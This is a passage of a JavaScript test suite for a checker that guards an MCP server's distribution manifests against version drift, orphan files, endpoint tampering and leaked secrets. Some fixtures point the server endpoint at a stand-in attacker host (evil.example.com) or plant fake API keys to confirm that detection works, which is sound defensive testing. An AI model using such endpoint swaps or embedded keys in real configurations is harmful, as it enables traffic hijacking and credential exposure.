// distribution/test/check.test.mjs — brief-A PHASE 5: one green fixture + >=1 red fixture per
// check, plus a mutation probe per check (does the check's own failure disappear when that
// check is skipped — the "temporarily disable check c" step, done via check.mjs's `skip`
// parameter rather than hand-editing the source file, see check.mjs's runChecks() doc comment
// for why that's the safer, reproducible equivalent).
//
// Every fixture is a temp-directory clone of a synthetic green baseline (distribution/test/
// fixtures.mjs) — nothing here ever reads or writes the real worktree's manifest files.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";

import { runChecks, collectClaimsIgnoreMarkers } from "../check.mjs";
import { buildGreenFixture, cloneFixture, cleanupFixture, readJson, writeJson, writeText } from "./fixtures.mjs";

let GREEN_ROOT;

test.before(() => {
  GREEN_ROOT = buildGreenFixture();
});

test.after(() => {
  cleanupFixture(GREEN_ROOT);
});

function findResult(results, name) {
  const r = results.find((x) => x.name === name);
  assert.ok(r, `no result for check "${name}"`);
  return r;
}

function assertAllPass(results, label) {
  for (const r of results) {
    assert.equal(r.failures.length, 0, `${label}: expected "${r.name}" to pass, got: ${JSON.stringify(r.failures, null, 2)}`);
  }
}

// ---------------------------------------------------------------------------------------
// Green fixture
// ---------------------------------------------------------------------------------------
test("green fixture: every check passes", async () => {
  assertAllPass(await runChecks(GREEN_ROOT), "green fixture");
});

// ---------------------------------------------------------------------------------------
// version_equal
// ---------------------------------------------------------------------------------------
test("version_equal: red when a generated row's version drifts from package.json", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // brief-N (2026-10-19, D2): gemini-extension.json (json-full, has version/name/description),
    // not npm-package/.claude-plugin/plugin.json (retired — see that row's replacement,
    // claude-plugins-external).
    const pj = readJson(root, "gemini-extension.json");
    pj.version = "9.9.9";
    writeJson(root, "gemini-extension.json", pj);

    const results = await runChecks(root);
    const vr = findResult(results, "version_equal");
    assert.ok(vr.failures.length >= 1, "expected version_equal to report a failure");
    assert.match(vr.failures[0], /rule=version_equal/);

    // mutation probe: skip version_equal -> its own failure list for this fixture must go to 0.
    const probed = findResult(await runChecks(root, { skip: new Set(["version_equal"]) }), "version_equal");
    assert.equal(probed.failures.length, 0, "disabling version_equal should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// generated_clean
// ---------------------------------------------------------------------------------------
test("generated_clean: red when an owned field is hand-edited after generation", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // brief-N (2026-10-19, D2): gemini-extension.json replaces the retired
    // npm-package/.claude-plugin/plugin.json as this suite's generic json-full example.
    const pj = readJson(root, "gemini-extension.json");
    // No count, under every description_max_len, version/name untouched — isolates this
    // fixture to generated_clean only (does not also trip version_equal or legibility).
    pj.description = "Hand-edited by a developer, bypassing distribution/generate.mjs entirely.";
    writeJson(root, "gemini-extension.json", pj);

    const results = await runChecks(root);
    const gc = findResult(results, "generated_clean");
    assert.ok(gc.failures.length >= 1, "expected generated_clean to report a failure");
    assert.match(gc.failures[0], /rule=generated_clean/);

    const probed = findResult(await runChecks(root, { skip: new Set(["generated_clean"]) }), "generated_clean");
    assert.equal(probed.failures.length, 0, "disabling generated_clean should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// no_orphans
// ---------------------------------------------------------------------------------------
test("no_orphans: red when a stray manifest-pattern file appears unclaimed", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "some/nested/subfolder/gemini-extension.json", '{"name":"novada-mcp"}\n');

    const results = await runChecks(root);
    const no = findResult(results, "no_orphans");
    assert.ok(no.failures.length >= 1, "expected no_orphans to report a failure");
    assert.match(no.failures[0], /rule=no_orphans/);
    assert.match(no.failures[0], /gemini-extension\.json/);

    const probed = findResult(await runChecks(root, { skip: new Set(["no_orphans"]) }), "no_orphans");
    assert.equal(probed.failures.length, 0, "disabling no_orphans should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("no_orphans: a file listed in known_orphans is NOT flagged (control case)", async () => {
  // hosted-server/smithery.yaml is a real known_orphans entry in the fixture's copied
  // channels.json — this asserts the green fixture's PASS above isn't a false negative from
  // an empty manifest_patterns walk, by independently re-checking that exact file is present
  // and still produces zero no_orphans failures.
  const results = await runChecks(GREEN_ROOT);
  const no = findResult(results, "no_orphans");
  assert.equal(no.failures.length, 0);
});

// ---------------------------------------------------------------------------------------
// location_rules
// ---------------------------------------------------------------------------------------
test("location_rules: red when a required manifest file is removed", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // glama.json is used (not plugin.json) because it has zero owned/verified fields — deleting
    // it cannot also crash generate.mjs's computeWrites() (which must read an owned row's file
    // to diff it), keeping this fixture isolated to location_rules only.
    rmSync(join(root, "npm-package", "glama.json"));

    const results = await runChecks(root);
    const lr = findResult(results, "location_rules");
    assert.ok(lr.failures.length >= 1, "expected location_rules to report a failure");
    assert.match(lr.failures[0], /rule=location_rules/);
    assert.match(lr.failures[0], /glama\.json/);

    const probed = findResult(await runChecks(root, { skip: new Set(["location_rules"]) }), "location_rules");
    assert.equal(probed.failures.length, 0, "disabling location_rules should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// legibility (4 independent red fixtures — hand-typed count / oversized description /
// unparseable JSON / name mismatch without an override)
// ---------------------------------------------------------------------------------------
test("legibility: red when a hand-typed platform count is inserted (the documented real bug)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // brief-N (2026-10-19, D2): gemini-extension.json replaces the retired
    // npm-package/.claude-plugin/plugin.json as this suite's generic json-full example.
    const pj = readJson(root, "gemini-extension.json");
    pj.description = "One MCP server for all web data — search, extract, crawl, scrape 13 platforms, proxy.";
    writeJson(root, "gemini-extension.json", pj);

    const results = await runChecks(root);
    const leg = findResult(results, "legibility");
    assert.ok(leg.failures.some((f) => /hand_typed_count/.test(f)), "expected a hand_typed_count failure");

    const probed = findResult(await runChecks(root, { skip: new Set(["legibility"]) }), "legibility");
    assert.equal(probed.failures.length, 0, "disabling legibility should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("legibility: red when a description exceeds its row's description_max_len", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const smitheryPath = join(root, "npm-package", "smithery.yaml");
    const raw = readFileSync(smitheryPath, "utf8");
    const tooLong = "x".repeat(300);
    const next = raw.replace(/^description:.*$/m, `description: "${tooLong}"`);
    writeFileSync(smitheryPath, next);

    const results = await runChecks(root);
    const leg = findResult(results, "legibility");
    assert.ok(leg.failures.some((f) => /description_len/.test(f)), "expected a description_len failure");

    const probed = findResult(await runChecks(root, { skip: new Set(["legibility"]) }), "legibility");
    assert.equal(probed.failures.length, 0, "disabling legibility should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("legibility: red when a manifest becomes unparseable JSON", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // brief-N (2026-10-19, D2): glama.json replaces the retired npm-package/.claude-plugin/
    // marketplace.json — same "zero owned/verified fields" isolation reasoning the
    // location_rules test above already uses for glama.json.
    const marketplacePath = join(root, "npm-package", "glama.json");
    const raw = readFileSync(marketplacePath, "utf8");
    writeFileSync(marketplacePath, raw.slice(0, -2)); // truncate -> invalid JSON

    const results = await runChecks(root);
    const leg = findResult(results, "legibility");
    assert.ok(leg.failures.some((f) => /invalid JSON/.test(f)), "expected an invalid-JSON failure");

    const probed = findResult(await runChecks(root, { skip: new Set(["legibility"]) }), "legibility");
    assert.equal(probed.failures.length, 0, "disabling legibility should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("legibility: red when a row's name no longer matches listing.name and no override is declared", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // brief-N (2026-10-19, D2): gemini-extension.json replaces the retired
    // npm-package/.claude-plugin/plugin.json as this suite's generic json-full example.
    const pj = readJson(root, "gemini-extension.json");
    pj.name = "totally-different-name";
    writeJson(root, "gemini-extension.json", pj);

    const results = await runChecks(root);
    const leg = findResult(results, "legibility");
    assert.ok(leg.failures.some((f) => /legibility\(name\)/.test(f)), "expected a name-mismatch failure");

    const probed = findResult(await runChecks(root, { skip: new Set(["legibility"]) }), "legibility");
    assert.equal(probed.failures.length, 0, "disabling legibility should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// =========================================================================================
// brief-A2 PHASE 4 — four new red fixtures, predicted BEFORE running (see the worker's
// returned report for the full prediction table). Each counts every failure line across ALL
// 5 checks, not just the "expected" one, specifically so a cascade (a mutation that trips more
// than one check, or a mutation that trips NONE) is caught and explained rather than silently
// asserted away.
// =========================================================================================

function totalFailureCount(results) {
  return results.reduce((n, r) => n + r.failures.length, 0);
}

test("brief-A2: gemini-extension.json moved out of the repo root into a subfolder — PREDICTED 4 failures (location_rules + generated_clean cascade from the same missing file, no_orphans on the new unclaimed copy, and — brief-O round 3, 2026-10-19 — surface_derived_consistent, since gemini-cli has no surface_peers and its own now-missing file was its only possible signal source, leaving its description-bearing row unprovable)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const original = readFileSync(join(root, "gemini-extension.json"), "utf8");
    rmSync(join(root, "gemini-extension.json"));
    writeText(root, "distribution/plugins/gemini-extension.json", original); // "moved into a subfolder"

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 4, `predicted 4 total failures, got:\n${JSON.stringify(results, null, 2)}`);

    const lr = findResult(results, "location_rules");
    assert.equal(lr.failures.length, 1);
    assert.match(lr.failures[0], /gemini-extension\.json/);

    const gc = findResult(results, "generated_clean");
    assert.equal(gc.failures.length, 1, "generate.mjs --check cannot read the row's file (it was moved away) and must report that as a failure, not silently skip the row");

    const no = findResult(results, "no_orphans");
    assert.equal(no.failures.length, 1, "the relocated copy matches the gemini-extension.json manifest_pattern but is claimed by no row's path");
    assert.match(no.failures[0], /distribution\/plugins\/gemini-extension\.json/);

    const sdc = findResult(results, "surface_derived_consistent");
    assert.equal(sdc.failures.length, 1, "gemini-cli declares no surface_peers, so its own (now-missing) file was the only possible signal source — derivation is null and, since gemini-cli has description_field set, that must FAIL, not silently skip");
    assert.match(sdc.failures[0], /row=gemini-cli/);

    assert.equal(findResult(results, "version_equal").failures.length, 0, "version_equal must defer to location_rules on a missing file, not also fail");
    assert.equal(findResult(results, "legibility").failures.length, 0, "legibility must defer to location_rules on a missing file, not also fail");

    // Mutation probe on the check this scenario is actually named for (location_rules): with
    // it disabled, its OWN failure list drops to 0 — the other two checks' failures are an
    // independent, correctly-attributed cascade from the same root cause and are unaffected.
    const probed = findResult(await runChecks(root, { skip: new Set(["location_rules"]) }), "location_rules");
    assert.equal(probed.failures.length, 0, "disabling location_rules should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("brief-F R1/R3 (was brief-A2's documented gap): antigravity mcp_config.json using \"url\" instead of \"serverUrl\" is NOW CAUGHT — PREDICTED 5 failures (endpoint_equal can no longer read the relocated url_field, generated_clean sees the now-missing-but-owned serverUrl as drift, field_shape's must-exist on serverUrl, field_shape's must-not-exist on url, and — brief-O round 3, 2026-10-19 — surface_derived_consistent on the sibling antigravity-plugin row, since renaming serverUrl away also breaks the ONLY structural signal antigravity-plugin's derived surface depends on via surface_peers, leaving its description-bearing row unprovable)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/antigravity/mcp_config.json");
    cfg.mcpServers.novada.url = cfg.mcpServers.novada.serverUrl;
    delete cfg.mcpServers.novada.serverUrl;
    writeJson(root, "distribution/plugins/antigravity/mcp_config.json", cfg);

    const results = await runChecks(root);
    assert.equal(
      totalFailureCount(results),
      5,
      `brief-F closed this gap (R1's url_field + R3's required_fields on antigravity-mcp-config); brief-O round 3 added a 5th, correctly-attributed cascade failure (surface_derived_consistent on antigravity-plugin, whose only path to a provable surface is this same now-broken peer signal) — this exact mutation was PREDICTED 0 failures before brief-F, 4 after brief-F, and must now be 5, got:\n${JSON.stringify(results, null, 2)}`
    );
    const sdc = findResult(results, "surface_derived_consistent");
    assert.equal(sdc.failures.length, 1, "antigravity-plugin's own file has no signal and its declared peer (antigravity-mcp-config) just lost its only url_field match — derivation is now null, and since antigravity-plugin has description_field set, that must FAIL, not silently skip");
    assert.match(sdc.failures[0], /row=antigravity-plugin/);
    assert.match(sdc.failures[0], /surface_peers/);

    const ee = findResult(results, "endpoint_equal");
    assert.equal(ee.failures.length, 1, "url_field (/mcpServers/novada/serverUrl) no longer resolves once the key is renamed, so endpoint_equal reports got=undefined");
    assert.match(ee.failures[0], /mcp_config\.json/);

    const gc = findResult(results, "generated_clean");
    assert.equal(gc.failures.length, 1, "serverUrl is now an OWNED field (brief-F R1) — generate.mjs --check reports the file as drifted because serverUrl would be (re)created");
    // brief-I (2026-10-15, I1): antigravity-mcp-config is now a json-full row — generate.mjs
    // rebuilds the WHOLE file from full_template and compares exact text, so the failure message
    // reports the generic "(file content)" fallback (checkGeneratedClean's existing fallback for
    // an empty per-field values map) rather than naming the specific field "serverUrl" the way
    // the old json-owned-fields partial-merge writer's diff used to.
    assert.match(gc.failures[0], /\(file content\)/);

    const fs_ = findResult(results, "field_shape");
    assert.equal(fs_.failures.length, 2, "one must=exist failure (serverUrl missing) + one must=not_exist failure (url present)");
    assert.ok(fs_.failures.some((f) => /serverUrl/.test(f) && /want=present/.test(f)));
    assert.ok(fs_.failures.some((f) => /\/mcpServers\/novada\/url/.test(f) && /want=absent/.test(f)));

    assert.equal(findResult(results, "legibility").failures.length, 0, "the bare url VALUE is still the real hosted endpoint — no secret, no parse error, no hand-typed count");

    // Mutation probes: disabling either new guard independently drops exactly its own failures.
    const probedEndpoint = findResult(await runChecks(root, { skip: new Set(["endpoint_equal"]) }), "endpoint_equal");
    assert.equal(probedEndpoint.failures.length, 0, "disabling endpoint_equal should make it report 0 failures");
    const probedShape = findResult(await runChecks(root, { skip: new Set(["field_shape"]) }), "field_shape");
    assert.equal(probedShape.failures.length, 0, "disabling field_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("brief-A2: a new row's version drifts from package.json (gemini-extension.json) — PREDICTED 2 failures (version_equal + generated_clean cascade, same pattern as the existing claude-code-plugin version test)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const ext = readJson(root, "gemini-extension.json");
    ext.version = "9.9.9";
    writeJson(root, "gemini-extension.json", ext);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    assert.equal(findResult(results, "version_equal").failures.length, 1);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "version is an owned field, so generate.mjs --check independently reports the same drift");

    const probed = findResult(await runChecks(root, { skip: new Set(["version_equal"]) }), "version_equal");
    assert.equal(probed.failures.length, 0, "disabling version_equal should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("brief-A2 NEW RULE legibility(secret_literal): red when an Authorization header carries a literal key-looking value — PREDICTED exactly 2 failures (legibility + generated_clean cascade, brief-I: antigravity-mcp-config is now json-full, so adding ANY key the full_template doesn't declare drifts the whole-file rebuild, independent of the secret_literal mechanism this test actually exercises)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/antigravity/mcp_config.json");
    cfg.mcpServers.novada.headers = { Authorization: "Bearer sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890" };
    writeJson(root, "distribution/plugins/antigravity/mcp_config.json", cfg);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const leg = findResult(results, "legibility");
    assert.equal(leg.failures.length, 1);
    assert.match(leg.failures[0], /legibility\(secret_literal\)/);
    assert.match(leg.failures[0], /mcp_config\.json/);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "the added `headers` key is not in full_template — the whole-file rebuild no longer matches, independent of the literal secret inside it");

    const probed = findResult(await runChecks(root, { skip: new Set(["legibility"]) }), "legibility");
    assert.equal(probed.failures.length, 0, "disabling legibility should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("brief-A2 NEW RULE legibility(secret_literal): a \\${VAR} template in the SAME position is NOT flagged (control case — templates stay allowed)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/antigravity/mcp_config.json");
    cfg.mcpServers.novada.headers = { Authorization: "Bearer ${NOVADA_API_KEY}" };
    writeJson(root, "distribution/plugins/antigravity/mcp_config.json", cfg);

    const results = await runChecks(root);
    assert.equal(findResult(results, "legibility").failures.length, 0, "a \\${VAR} template must never be flagged as a literal secret");
    // brief-I (2026-10-15, I1): antigravity-mcp-config is now json-full — adding the `headers`
    // key at all (regardless of its value being a template) drifts the whole-file rebuild, an
    // independent and correctly-attributed guard this test isn't exercising; narrowed to the
    // legibility-specific assertion above instead of a total===0 assertion (same reasoning as
    // every other "one edit, two independent guards" case already documented in this file).
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "the added `headers` key is not in full_template, independent of its templated value");
  } finally {
    cleanupFixture(root);
  }
});

test("brief-A2 NEW RULE legibility(secret_literal): a git commit SHA (e.g. marketplace.json's source.sha) is NOT a false positive", async () => {
  // Control case proving the secret-prefix scan is scoped to real key FORMATS, not a generic
  // long-hex-string scan — marketplace.json's own 40-char hex sha is exactly the kind of
  // benign long identifier a naive high-entropy regex would false-positive on.
  const results = await runChecks(GREEN_ROOT);
  assert.equal(findResult(results, "legibility").failures.length, 0);
});


// =========================================================================================
// brief-F (2026-10-15) — new guards: endpoint_equal (R1), field_shape/type (R3), ci_paths_cover
// (R2), secret_literal key/URL extensions (R4), claims_consistent (R10). Each test predicts its
// failure count/shape before asserting it, per the brief's own prediction-table requirement.
// =========================================================================================

// ---------------------------------------------------------------------------------------
// endpoint_equal (R1)
// ---------------------------------------------------------------------------------------
test("endpoint_equal: red when gemini-extension.json's httpUrl is tampered — PREDICTED 2 failures (endpoint_equal + generated_clean cascade, since httpUrl is OWNED)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const ext = readJson(root, "gemini-extension.json");
    ext.mcpServers.novada.httpUrl = "https://evil.example.com/mcp";
    writeJson(root, "gemini-extension.json", ext);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const ee = findResult(results, "endpoint_equal");
    assert.equal(ee.failures.length, 1);
    assert.match(ee.failures[0], /gemini-extension\.json/);
    assert.match(ee.failures[0], /got="https:\/\/evil\.example\.com\/mcp"/);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "httpUrl is owned, so generate.mjs --check independently reports the same drift");

    const probed = findResult(await runChecks(root, { skip: new Set(["endpoint_equal"]) }), "endpoint_equal");
    assert.equal(probed.failures.length, 0, "disabling endpoint_equal should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("endpoint_equal: red when openai .mcp.json's url is tampered — PREDICTED 2 failures (endpoint_equal + generated_clean cascade)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const mcp = readJson(root, "distribution/plugins/openai/.mcp.json");
    mcp.mcpServers.novada.url = "https://evil.example.com/mcp";
    writeJson(root, "distribution/plugins/openai/.mcp.json", mcp);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    assert.equal(findResult(results, "endpoint_equal").failures.length, 1);
    assert.equal(findResult(results, "generated_clean").failures.length, 1);
  } finally {
    cleanupFixture(root);
  }
});

test("endpoint_equal: red when npm-package/server.json's remotes[0].url is tampered — PREDICTED exactly 2 failures (endpoint_equal + closed_shape(pinned) — brief-I: server.json's pinned_fields now ALSO pins /remotes/0/url to the exact same literal, a deliberate, accepted overlap with endpoint_equal's dynamic check, per this finding's own instruction to pin remotes[*].url; VERIFY-ONLY still means no generated_clean cascade)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.remotes[0].url = "https://evil.example.com/mcp";
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures (verify-only, not owned by generate.mjs — but closed_shape's pinned_fields independently asserts the same literal), got:\n${JSON.stringify(results, null, 2)}`);
    const ee = findResult(results, "endpoint_equal");
    assert.equal(ee.failures.length, 1);
    assert.match(ee.failures[0], /server\.json/);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1, "closed_shape's pinned_fields entry for /remotes/0/url independently catches the same tamper");
    assert.match(cs.failures[0], /pinned/);
    assert.match(cs.failures[0], /\/remotes\/0\/url/);
    assert.equal(findResult(results, "generated_clean").failures.length, 0, "server.json is gen-server-json.mjs-owned, never generate.mjs-owned — no cascade");

    const probed = findResult(await runChecks(root, { skip: new Set(["endpoint_equal"]) }), "endpoint_equal");
    assert.equal(probed.failures.length, 0, "disabling endpoint_equal should make it report 0 failures");
    const probedShape = findResult(await runChecks(root, { skip: new Set(["closed_shape"]) }), "closed_shape");
    assert.equal(probedShape.failures.length, 0, "disabling closed_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// field_shape (R3) — openai .mcp.json's `type` literal
// ---------------------------------------------------------------------------------------
test("field_shape: red when openai .mcp.json's type is not \"http\" — PREDICTED exactly 2 failures (field_shape + generated_clean cascade, brief-I: openai-codex-mcp-config is json-full — type is part of full_template, so changing its value drifts the whole-file rebuild exactly as it would for any other owned-value change elsewhere in this suite)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const mcp = readJson(root, "distribution/plugins/openai/.mcp.json");
    mcp.mcpServers.novada.type = "sse";
    writeJson(root, "distribution/plugins/openai/.mcp.json", mcp);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const fs_ = findResult(results, "field_shape");
    assert.equal(fs_.failures.length, 1);
    assert.match(fs_.failures[0], /pointer=\/mcpServers\/novada\/type/);
    assert.match(fs_.failures[0], /got="sse"/);
    assert.match(fs_.failures[0], /want="http"/);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "type is part of full_template — changing its value drifts the whole-file rebuild, independent of field_shape's own pointer-level check");

    const probed = findResult(await runChecks(root, { skip: new Set(["field_shape"]) }), "field_shape");
    assert.equal(probed.failures.length, 0, "disabling field_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// ci_paths_cover (R2)
// ---------------------------------------------------------------------------------------
test("ci_paths_cover: red when ci.yml carries a paths: filter that misses a channel row's path — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // The green fixture's ci.yml has NO paths: filter (trivially covers everything). Add a
    // SCOPED filter here that covers every real row EXCEPT gemini-extension.json's repo-root
    // path, reproducing the exact real-world bug (R2) this check exists to catch.
    writeText(
      root,
      ".github/workflows/ci.yml",
      [
        "name: CI",
        "on:",
        "  push:",
        "    paths:",
        '      - "npm-package/**"',
        '      - "distribution/**"',
        "  workflow_dispatch: {}",
        "",
      ].join("\n")
    );

    const results = await runChecks(root);
    const cp = findResult(results, "ci_paths_cover");
    assert.equal(cp.failures.length, 1, `predicted exactly 1 failure (only gemini-extension.json's row is uncovered), got:\n${JSON.stringify(cp.failures, null, 2)}`);
    assert.match(cp.failures[0], /row=gemini-cli/);
    assert.match(cp.failures[0], /path=gemini-extension\.json/);
    assert.equal(totalFailureCount(results), 1, "no other check should be affected by this ci.yml-only mutation");

    const probed = findResult(await runChecks(root, { skip: new Set(["ci_paths_cover"]) }), "ci_paths_cover");
    assert.equal(probed.failures.length, 0, "disabling ci_paths_cover should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("ci_paths_cover: a paths: filter that covers every row (literal filename entry) passes — PREDICTED 0 failures (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(
      root,
      ".github/workflows/ci.yml",
      [
        "name: CI",
        "on:",
        "  push:",
        "    paths:",
        '      - "npm-package/**"',
        '      - "distribution/**"',
        '      - "gemini-extension.json"',
        "  workflow_dispatch: {}",
        "",
      ].join("\n")
    );
    const results = await runChecks(root);
    assert.equal(findResult(results, "ci_paths_cover").failures.length, 0);
  } finally {
    cleanupFixture(root);
  }
});

test("ci_paths_cover: a brand-new row at an uncovered root path is caught by a scoped filter — PREDICTED exactly 1 failure (red test for the CLASS, per the brief's own instruction)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(
      root,
      ".github/workflows/ci.yml",
      [
        "name: CI",
        "on:",
        "  push:",
        "    paths:",
        '      - "npm-package/**"',
        '      - "distribution/**"',
        '      - "gemini-extension.json"',
        "  workflow_dispatch: {}",
        "",
      ].join("\n")
    );
    // A new channel row at a brand-new repo-root path, never anticipated by the filter above.
    const channels = readJson(root, "distribution/channels.json");
    channels.rows.push({
      id: "future-channel",
      path: "future-channel-manifest.json",
      location_rule: "test-only row",
      writer_kind: null,
      owned_fields: [],
      version_field: null,
      name_field: null,
      description_field: null,
      generated_by: null,
      install_snippet: "# test-only",
    });
    writeJson(root, "distribution/channels.json", channels);
    writeText(root, "future-channel-manifest.json", '{"ok":true}\n');

    const results = await runChecks(root);
    const cp = findResult(results, "ci_paths_cover");
    assert.equal(cp.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cp.failures, null, 2)}`);
    assert.match(cp.failures[0], /row=future-channel/);
    assert.match(cp.failures[0], /path=future-channel-manifest\.json/);
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// secret_literal extensions (R4) — x-api-key / *token*-shaped keys, URL query-param secrets
// ---------------------------------------------------------------------------------------
test("R4 NEW: legibility(secret_literal) red when a header literally named \"x-api-key\" carries a non-templated value — PREDICTED exactly 2 failures (legibility + generated_clean cascade, brief-I: antigravity-mcp-config is json-full — adding ANY key full_template doesn't declare drifts the whole-file rebuild, independent of secret_literal)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/antigravity/mcp_config.json");
    cfg.mcpServers.novada.headers = { "x-api-key": "sk-aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890" };
    writeJson(root, "distribution/plugins/antigravity/mcp_config.json", cfg);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const leg = findResult(results, "legibility");
    assert.equal(leg.failures.length, 1);
    assert.match(leg.failures[0], /field=.*x-api-key/);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "the added `headers` key is not in full_template");
  } finally {
    cleanupFixture(root);
  }
});

test("R4 NEW: legibility(secret_literal) red when a *token*-shaped key (not just \"Authorization\") carries a literal value — PREDICTED exactly 2 failures (legibility + generated_clean cascade, brief-I: openai-codex-mcp-config is json-full — same reasoning as the x-api-key test above)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/openai/.mcp.json");
    cfg.mcpServers.novada.access_token = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890";
    writeJson(root, "distribution/plugins/openai/.mcp.json", cfg);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const leg = findResult(results, "legibility");
    assert.equal(leg.failures.length, 1);
    assert.match(leg.failures[0], /field=.*access_token/);
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "the added `access_token` key is not in full_template");
  } finally {
    cleanupFixture(root);
  }
});

test("R4 NEW: legibility(secret_literal) a *token*-shaped key is NOT flagged when its value is a \\${VAR} template (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/openai/.mcp.json");
    cfg.mcpServers.novada.access_token = "${NOVADA_API_KEY}";
    writeJson(root, "distribution/plugins/openai/.mcp.json", cfg);

    const results = await runChecks(root);
    assert.equal(findResult(results, "legibility").failures.length, 0, "a templated *token*-shaped field must never be flagged");
    // brief-I (2026-10-15, I1): same unavoidable cascade as the Authorization/x-api-key tests
    // above — adding the `access_token` key at all (template or not) drifts the full_template
    // rebuild; narrowed to the legibility-specific assertion rather than total===0.
    assert.equal(findResult(results, "generated_clean").failures.length, 1, "the added `access_token` key is not in full_template, independent of its templated value");
  } finally {
    cleanupFixture(root);
  }
});

test("R4 NEW: legibility(secret_literal) red when a literal API key sits in a URL's own query string — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/antigravity/mcp_config.json");
    // Deliberately an OPAQUE value with no recognized secret-prefix shape (no "sk-"/"ghp_"/etc.)
    // so this exercises checkUrlQuerySecrets specifically, not the pre-existing SECRET_PREFIX_PATTERN
    // branch (which runs first and returns early on a match, same cascade-attribution concern as
    // every other mutation test in this file — a recognizably-prefixed key in a query string would
    // mask the very code path this test exists to prove).
    cfg.mcpServers.novada.serverUrl = "https://mcp.novada.com/mcp?apikey=myPlainOpaqueDeployValue123456";
    writeJson(root, "distribution/plugins/antigravity/mcp_config.json", cfg);

    const results = await runChecks(root);
    // endpoint_equal ALSO fires here (the URL no longer equals listing.hosted_endpoint exactly) —
    // this mutation exercises two independent, correctly-attributed guards from one edit, same
    // cascade pattern as the version-drift tests above.
    const leg = findResult(results, "legibility");
